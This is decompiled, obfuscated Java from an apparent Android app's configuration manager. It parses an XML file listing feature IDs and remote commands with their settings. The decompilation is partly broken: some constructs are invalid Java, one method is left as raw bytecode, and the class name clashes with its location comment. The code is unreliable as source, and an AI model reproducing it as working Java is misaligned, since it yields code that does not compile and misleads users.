package com.vvt.configurationmanager;

import com.vvt.ak.a;
import com.vvt.base.FeatureId;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.w3c.dom.Attr;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class b
{
  private static boolean a = a.e;
  
  private static c a(Element paramElement)
  {
    Object localObject1 = null;
    int i = Integer.parseInt(paramElement.getAttributeNode("id").getValue());
    NodeList localNodeList = paramElement.getChildNodes();
    int j = 0;
    Object localObject2 = null;
    int k = 0;
    int m = 0;
    Object localObject3 = null;
    j = localNodeList.getLength();
    String str1;
    String str2;
    if (k < j)
    {
      localObject2 = localNodeList.item(k);
      int n = ((Node)localObject2).getNodeType();
      int i1 = 1;
      if (n != i1) {
        break label239;
      }
      str1 = ((Node)localObject2).getNodeName();
      str2 = "features";
      boolean bool2 = str1.equals(str2);
      if (bool2)
      {
        localObject2 = b((Element)localObject2);
        Object localObject4 = localObject1;
        localObject1 = localObject2;
        localObject2 = localObject4;
      }
    }
    for (;;)
    {
      m = k + 1;
      k = m;
      localObject3 = localObject1;
      localObject1 = localObject2;
      break;
      str2 = "remote_commands";
      boolean bool1 = str1.equals(str2);
      if (bool1)
      {
        localObject2 = c((Element)localObject2);
        localObject1 = localObject3;
        continue;
        if ((localObject3 == null) || (localObject1 == null))
        {
          localObject2 = new com/vvt/configurationmanager/PcfParsingException;
          ((PcfParsingException)localObject2).<init>();
          throw ((Throwable)localObject2);
        }
        localObject2 = new com/vvt/configurationmanager/c;
        ((c)localObject2).<init>();
        ((c)localObject2).a(i);
        ((c)localObject2).a((List)localObject3);
        ((c)localObject2).a((Map)localObject1);
        return (c)localObject2;
      }
      else
      {
        label239:
        localObject2 = localObject1;
        localObject1 = localObject3;
      }
    }
  }
  
  /* Error */
  public static List a(String paramString)
  {
    // Byte code:
    //   0: new 95	java/util/ArrayList
    //   3: astore_1
    //   4: aload_1
    //   5: invokespecial 96	java/util/ArrayList:<init>	()V
    //   8: iconst_0
    //   9: istore_2
    //   10: aconst_null
    //   11: astore_3
    //   12: new 98	java/io/ByteArrayInputStream
    //   15: astore 4
    //   17: aload_0
    //   18: invokevirtual 102	java/lang/String:getBytes	()[B
    //   21: astore 5
    //   23: aload 4
    //   25: aload 5
    //   27: invokespecial 105	java/io/ByteArrayInputStream:<init>	([B)V
    //   30: invokestatic 111	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   33: astore_3
    //   34: aload_3
    //   35: invokevirtual 115	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   38: astore_3
    //   39: aload_3
    //   40: aload 4
    //   42: invokevirtual 121	javax/xml/parsers/DocumentBuilder:parse	(Ljava/io/InputStream;)Lorg/w3c/dom/Document;
    //   45: astore_3
    //   46: aload_3
    //   47: invokeinterface 127 1 0
    //   52: astore 5
    //   54: aload 5
    //   56: invokeinterface 130 1 0
    //   61: ldc -124
    //   63: astore 5
    //   65: aload_3
    //   66: aload 5
    //   68: invokeinterface 136 2 0
    //   73: astore 6
    //   75: iconst_0
    //   76: istore_2
    //   77: aconst_null
    //   78: astore_3
    //   79: iconst_0
    //   80: istore 7
    //   82: aconst_null
    //   83: astore 5
    //   85: aload 6
    //   87: invokeinterface 43 1 0
    //   92: istore_2
    //   93: iload 7
    //   95: iload_2
    //   96: if_icmpge +100 -> 196
    //   99: aload 6
    //   101: iload 7
    //   103: invokeinterface 47 2 0
    //   108: astore_3
    //   109: aload_3
    //   110: invokeinterface 53 1 0
    //   115: istore 8
    //   117: iconst_1
    //   118: istore 9
    //   120: iload 8
    //   122: iload 9
    //   124: if_icmpne +21 -> 145
    //   127: aload_3
    //   128: checkcast 17	org/w3c/dom/Element
    //   131: astore_3
    //   132: aload_3
    //   133: invokestatic 139	com/vvt/configurationmanager/removeFromPath:a	(Lorg/w3c/dom/Element;)Lcom/vvt/configurationmanager/MyUncaughtExceptionHandler;
    //   136: astore_3
    //   137: aload_1
    //   138: aload_3
    //   139: invokeinterface 144 2 0
    //   144: pop
    //   145: iload 7
    //   147: iconst_1
    //   148: iadd
    //   149: istore_2
    //   150: iload_2
    //   151: istore 7
    //   153: goto -68 -> 85
    //   156: astore 4
    //   158: getstatic 13	com/vvt/configurationmanager/removeFromPath:a	Z
    //   161: istore 10
    //   163: iload 10
    //   165: ifeq +3 -> 168
    //   168: new 77	com/vvt/configurationmanager/PcfParsingException
    //   171: astore 4
    //   173: aload 4
    //   175: invokespecial 81	com/vvt/configurationmanager/PcfParsingException:<init>	()V
    //   178: aload 4
    //   180: athrow
    //   181: astore 11
    //   183: aload_3
    //   184: astore 4
    //   186: aload 11
    //   188: astore_3
    //   189: aload 4
    //   191: invokestatic 149	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   194: aload_3
    //   195: athrow
    //   196: aload 4
    //   198: invokestatic 149	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   201: aload_1
    //   202: areturn
    //   203: astore 11
    //   205: iconst_0
    //   206: istore 10
    //   208: aconst_null
    //   209: astore 4
    //   211: aload 11
    //   213: astore_3
    //   214: goto -25 -> 189
    //   217: astore_3
    //   218: goto -29 -> 189
    //   221: astore_3
    //   222: aload 4
    //   224: astore_3
    //   225: goto -67 -> 158
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	228	0	paramString	String
    //   3	199	1	localArrayList	ArrayList
    //   9	142	2	i	int
    //   11	203	3	localObject1	Object
    //   217	1	3	localObject2	Object
    //   221	1	3	localException1	Exception
    //   224	1	3	localObject3	Object
    //   15	26	4	localByteArrayInputStream	java.io.ByteArrayInputStream
    //   156	1	4	localException2	Exception
    //   171	52	4	localObject4	Object
    //   21	63	5	localObject5	Object
    //   73	27	6	localNodeList	NodeList
    //   80	72	7	j	int
    //   115	10	8	k	int
    //   118	7	9	m	int
    //   161	46	10	bool	boolean
    //   181	6	11	localObject6	Object
    //   203	9	11	localObject7	Object
    // Exception table:
    //   from	to	target	type
    //   12	15	156	java/lang/Exception
    //   17	21	156	java/lang/Exception
    //   25	30	156	java/lang/Exception
    //   158	161	181	finally
    //   168	171	181	finally
    //   173	178	181	finally
    //   178	181	181	finally
    //   12	15	203	finally
    //   17	21	203	finally
    //   25	30	203	finally
    //   30	33	217	finally
    //   34	38	217	finally
    //   40	45	217	finally
    //   46	52	217	finally
    //   54	61	217	finally
    //   66	73	217	finally
    //   85	92	217	finally
    //   101	108	217	finally
    //   109	115	217	finally
    //   127	131	217	finally
    //   132	136	217	finally
    //   138	145	217	finally
    //   30	33	221	java/lang/Exception
    //   34	38	221	java/lang/Exception
    //   40	45	221	java/lang/Exception
    //   46	52	221	java/lang/Exception
    //   54	61	221	java/lang/Exception
    //   66	73	221	java/lang/Exception
    //   85	92	221	java/lang/Exception
    //   101	108	221	java/lang/Exception
    //   109	115	221	java/lang/Exception
    //   127	131	221	java/lang/Exception
    //   132	136	221	java/lang/Exception
    //   138	145	221	java/lang/Exception
  }
  
  private static ArrayList b(Element paramElement)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    NodeList localNodeList = paramElement.getElementsByTagName("feature");
    int i = 0;
    Object localObject = null;
    for (int j = 0;; j = i)
    {
      i = localNodeList.getLength();
      if (j >= i) {
        break;
      }
      localObject = localNodeList.item(j);
      int k = ((Node)localObject).getNodeType();
      int m = 1;
      if (k == m)
      {
        localObject = (Element)localObject;
        String str = "id";
        i = Integer.parseInt(((Element)localObject).getAttributeNode(str).getValue());
        localObject = FeatureId.forValue(i);
        if (localObject != null) {
          localArrayList.add(localObject);
        }
      }
      i = j + 1;
    }
    return localArrayList;
  }
  
  private static Map c(Element paramElement)
  {
    int i = 1;
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    Object localObject = "cmd";
    NodeList localNodeList1 = paramElement.getElementsByTagName((String)localObject);
    int k;
    for (int j = 0;; j = k)
    {
      k = localNodeList1.getLength();
      if (j >= k) {
        break;
      }
      localObject = localNodeList1.item(j);
      int m = ((Node)localObject).getNodeType();
      if (m == i)
      {
        localObject = (Element)localObject;
        Attr localAttr = ((Element)localObject).getAttributeNode("id");
        String str1 = localAttr.getValue();
        ArrayList localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        int n = ((Element)localObject).hasChildNodes();
        if (n != 0)
        {
          NodeList localNodeList2 = ((Element)localObject).getElementsByTagName("setting");
          n = 0;
          localAttr = null;
          for (;;)
          {
            k = localNodeList2.getLength();
            if (n >= k) {
              break;
            }
            localObject = localNodeList2.item(n);
            int i1 = ((Node)localObject).getNodeType();
            if (i1 == i)
            {
              localObject = (Element)localObject;
              String str2 = "id";
              localObject = ((Element)localObject).getAttributeNode(str2).getValue();
              localArrayList.add(localObject);
            }
            k = n + 1;
            n = k;
          }
        }
        localHashMap.put(str1, localArrayList);
      }
      k = j + 1;
    }
    return localHashMap;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/configurationmanager/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */